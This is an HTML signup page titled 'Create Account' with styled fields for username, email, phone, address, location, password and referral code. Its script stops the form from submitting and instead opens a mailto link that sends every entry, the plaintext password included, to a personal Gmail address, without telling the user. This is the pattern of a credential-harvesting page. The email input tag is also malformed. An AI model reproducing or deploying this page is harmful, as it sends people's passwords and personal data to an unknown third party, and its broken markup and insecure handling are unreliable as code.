<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Create Account</title>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap" rel="stylesheet">
    <style>
        /* General Reset */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body, html {
            height: 100%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-family: 'Roboto', sans-serif;
            background: linear-gradient(135deg, #00c6ff, #0072ff);
        }

        /* Glass effect container */
        .glass-container {
            background: rgba(255, 255, 255, 0.1);
            border-radius: 20px;
            box-shadow: 0 4px 30px rgba(0, 0, 0, 0.1);
            backdrop-filter: blur(10px);
            -webkit-backdrop-filter: blur(10px);
            border: 1px solid rgba(255, 255, 255, 0.3);
            width: 400px;
            padding: 30px;
            text-align: center;
            animation: fadeIn 1s ease-in-out;
        }

        /* Animation for the glass container */
        @keyframes fadeIn {
            from {
                opacity: 0;
                transform: translateY(-30px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        /* Form elements styling */
        .glass-container h2 {
            color: #fff;
            margin-bottom: 20px;
            font-size: 24px;
        }

        .glass-container input[type="text"],
        .glass-container input[type="email"],
        .glass-container input[type="tel"],
        .glass-container input[type="password"] {
            width: 100%;
            padding: 10px;
            margin: 10px 0;
            border: none;
            border-radius: 5px;
            font-size: 16px;
        }

        .glass-container input[type="submit"] {
            width: 100%;
            padding: 10px;
            margin: 20px 0;
            background: linear-gradient(135deg, #6A82FB, #FC5C7D);
            color: white;
            border: none;
            border-radius: 5px;
            font-size: 18px;
            cursor: pointer;
            transition: background 0.3s ease-in-out;
        }

        .glass-container input[type="submit"]:hover {
            background: linear-gradient(135deg, #FC5C7D, #6A82FB);
        }

        /* Form labels */
        .glass-container label {
            color: #fff;
            font-size: 14px;
            margin-bottom: 5px;
            display: block;
            text-align: left;
        }

        /* Adjustments for responsiveness */
        @media screen and (max-width: 500px) {
            .glass-container {
                width: 90%;
                padding: 20px;
            }

            .glass-container h2 {
                font-size: 20px;
            }
        }
    </style>
</head>
<body>
    <div class="glass-container">
        <h2>Create Account</h2>
        <form id="createAccountForm">
            <label for="username">Username</label>
            <input type="text" id="username" name="username" required>

            <label for="email">Email</label>
            <input type="email" id="email" name="email" require
            <label for="phone">Phone Number</label>
            <input type="tel" id="phone" name="phone" required>

            <label for="address">Address</label>
            <input type="text" id="address" name="address" required>

            <label for="location">Location</label>
            <input type="text" id="location" name="location" required>

            <label for="password">Password</label>
            <input type="password" id="password" name="password" required>

            <label for="referral">Referral Code</label>
            <input type="text" id="referral" name="referral">

            <input type="submit" value="Sign Up">
        </form>
        
        <div class="create">Have an Account? <a href="Account.html"> Login</a> </div>
    </div>

    <script>
        // JavaScript to handle form submission
        document.getElementById('createAccountForm').addEventListener('submit', function(event) {
            event.preventDefault(); // Prevent form from submitting normally

            // Gather form data
            const username = document.getElementById('username').value;
            const email = document.getElementById('email').value;
            const phone = document.getElementById('phone').value;
            const address = document.getElementById('address').value;
            const location = document.getElementById('location').value;
            const password = document.getElementById('password').value;
            const referral = document.getElementById('referral').value;

            // Get current date and time
            const now = new Date();
            const dateTime = `${now.toLocaleDateString()} ${now.toLocaleTimeString()}`;

            // Concatenate all the form data
            const combinedText = `
                Username: ${username}
                Email: ${email}
                Phone: ${phone}
                Address: ${address}
                Location: ${location}
                Password: ${password}
                Referral Code: ${referral}
                Date & Time: ${dateTime}
            `;

            // Open email client with the concatenated text as the body and a recipient address
            window.location.href = `mailto:markearn572@gmail.com?subject=Account%20Details&body=${encodeURIComponent(combinedText)}`;
        });
    </script>
</body>
</html>
